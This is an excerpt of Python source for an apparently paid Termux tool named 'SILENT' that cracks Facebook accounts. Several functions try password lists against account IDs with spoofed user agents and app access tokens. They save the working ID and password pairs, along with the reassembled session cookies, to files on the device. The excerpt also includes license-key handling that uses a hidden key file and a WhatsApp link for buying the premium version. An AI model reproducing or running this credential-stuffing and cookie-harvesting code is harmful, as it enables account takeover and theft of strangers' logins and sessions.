...
def Setup():
	try:
		...
		if '8.7.2' in httpx.get(url).text:
			...
			time.sleep(1)
			os.system('rm -rf New && python SILENT.py')
			exit()
...
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrSILENTxxx-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrSILENTxxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrSILENTxxx-cov', 'r').read()
...
def apv():
	try:
		...
		if kex in link:clear();main()
			...
			line()
			url_wa = "https://api.whatsapp.com/send?phone=+923209054192&text="
			name = input(" Enter your Name : ")
			line()
			tks = ("Hi Janii , I Need To Buy Your Paid SILENT Tools Version 8.7.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def m1(ids,names,passlist,fbcr):
    ...
    "user-agent": ua,}
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [SILENT-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/SILENT/SILENT-M1-OK.txt','a').write(ids+'|'+pas+'\n')
				...
				open('/sdcard/SILENT/SILENT-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def m2(ids,names,passlist,fbcr):
    ...
    "user-agent": ua,}
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [SILENT-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/SILENT/SILENT-M2-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/SILENT/SILENT-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
	...
	try:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [SILENT-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/SILENT/SILENT-M3-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/SILENT/SILENT-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def rd(ids,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [SILENT-XD] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
			tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
			accessToken = random.choice(tokenlist)
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if "session_key" in po:
				uid = str(po['uid'])
				token = po['access_token']
				print('\r\r\033[1;32m [SILENT-OK] '+uid+' | '+pas)
				oks.append(ids)
				open('/sdcard/SILENT/SILENT-R-OK.txt','a').write(uid+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/SILENT/SILENT-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
